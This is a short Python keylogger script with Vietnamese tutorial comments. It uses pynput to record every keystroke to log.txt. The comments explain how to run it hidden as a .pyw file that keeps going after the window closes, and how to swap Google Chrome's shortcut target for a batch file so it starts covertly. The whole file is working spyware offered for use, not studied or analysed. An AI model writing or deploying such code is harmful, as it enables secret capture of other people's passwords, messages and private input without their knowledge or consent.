# download python
# thường thì download python sẽ có lun pynput nếu k có thì down thêm
        # download pynput để lắng nghe keyboard, mouse
        #nếu lỗi not regconized thì search: get pip.py
        #copy vào file a.py
        #chạy lại python a.py trên cmd
        #chạy lại pip install pynput trên cmd
#dổi file a.py thành a.pyw: w là chạy ẩn dưới window. tắt app đi vẫn chạy ngầm
#để chạy a.pyw nhập vào cmd: 
                            #D:
                            #cd workspace dev
                            # pythonw a.pyw
                            #
#chuyển target của google chrome thành target của a.bat
from pynput.keyboard import Listener

def anonymous(key):     #def là function
    key = str(key)
    key.replace("'", "") #thay dấu ' thành chỗ trống
    if key == "Key.f12": 
        raise SystemExit(0) #khi ấn F12 sẽ tắt app python
    if key == "Key_ctrl_l":
        key ="\n"
    if key == "Key.enter":
        key = "\n"        #\n la new line: dòng mới
    if key == "Key.alt_l":
        key = "\n"
    if key == "Key.tab":   
        key = "\n" 
    with open("log.txt", 'a') as file: #python phân biệt giữa tab và dấu cách. chỉ được dùng tab hoặc space
        file.write(key)                 #tạo file log.txt lưu trữ content
    print(key)
    
with Listener(on_press=anonymous) as hacker:
    hacker.join()
#để tăt file chạy ẩn
    #ấn F12 hoặc ấn Ctrl + C
    #hoặc Task manager > detail > Tìm pythonw.exe > End Task
